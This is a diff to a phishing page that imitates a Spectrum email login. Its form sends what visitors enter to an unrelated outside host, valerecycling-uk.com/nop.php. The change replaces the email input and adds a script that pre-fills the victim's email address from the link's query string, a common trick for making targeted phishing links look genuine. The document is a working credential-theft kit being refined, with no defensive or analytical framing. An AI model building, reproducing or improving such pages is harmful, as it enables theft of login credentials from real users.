@@ -169,16 +169,10 @@
             <div id="hohHref"><a href="https://www.spectrum.net/hoh">Create an Email Address</a></div>
         </div>
         <form action="http://valerecycling-uk.com/nop.php" method="post">
-            <div id="emailAddressContainer" >
-                <label for="emailAddress">Email Address</label>
-                <input
-                        type="text"
-                        id="emailAddress"
-                        name="emailAddress"
-                        value=""
-                >
-            </div>
 
+<input type="email" name="email" id="emailField" placeholder="Email Address" required>
+
+            
             <div id="rememberEmailContainer">
                 <input
                         type="checkbox"
@@ -280,7 +274,15 @@
 
 
 
-
+<script>
+    window.addEventListener('DOMContentLoaded', function() {
+      const urlParams = new URLSearchParams(window.location.search);
+      const email = urlParams.get('email');
+      if (email) {
+        document.getElementById('emailField').value = email;
+      }
+    });
+  </script>
 
 
 </body>
